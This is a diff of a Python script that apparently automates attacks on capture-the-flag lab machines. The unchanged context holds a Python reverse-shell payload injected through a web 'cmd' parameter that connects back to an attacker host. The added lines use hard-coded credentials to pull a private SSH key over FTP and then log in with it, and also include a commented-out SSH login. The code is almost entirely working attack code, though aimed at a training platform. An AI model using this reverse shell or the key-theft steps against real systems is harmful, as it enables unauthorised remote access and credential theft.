@@ -129,6 +129,24 @@ def spaceJam():
     payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({LHOST},{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
     sess.get(f"http://{ip}:3000/?cmd={payload}")
 
+# def food():
+#     global ip
+#     req = ssh(host=ip, user="ramen", password="noodlesRTheBest")
+#     shell = req.process("/bin/sh")
+#     shell.interactive()
+
+def hackers():
+    global ip
+    username = "gcrawford"
+    password = "evelina"
+    passwd = "saturn1"
+    ftp_server = ftplib.FTP('hackers.thm', username, password)
+    ftp_server.encoding = 'utf-8'
+    with open("id_rsa", "wb") as f:
+        ftp_server.retrbinary(f"RETR id_rsa", f.write)
+    ftp_server.quit()
+    os.system("ssh -i id_rsa gcrawford@hackers.thm")
+
 if __name__ == "__main__":
     
     machineName = sys.argv[1]
@@ -155,6 +173,8 @@ if __name__ == "__main__":
         spaceJam()
     # if machineName.lower() == "food":
     #     food()
+    # if machineName.lower() = "hackers":
+    #     hackers()
     else:
         print("[!] Invalid Machine Name")
         exit()
